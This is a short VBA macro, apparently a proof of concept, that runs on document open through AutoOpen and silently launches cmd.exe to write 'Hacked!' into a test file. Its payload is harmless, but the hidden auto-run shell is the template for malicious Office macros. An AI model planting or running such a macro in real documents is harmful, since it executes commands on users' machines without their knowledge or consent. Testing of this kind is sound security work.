
Sub AutoOpen()
    Dim cmd As String
    cmd = "cmd.exe /c echo Hacked! > C:\Users\alasdairTRE\Desktop\TestScripts\poc.txt"
    Shell cmd, vbHide
End Sub
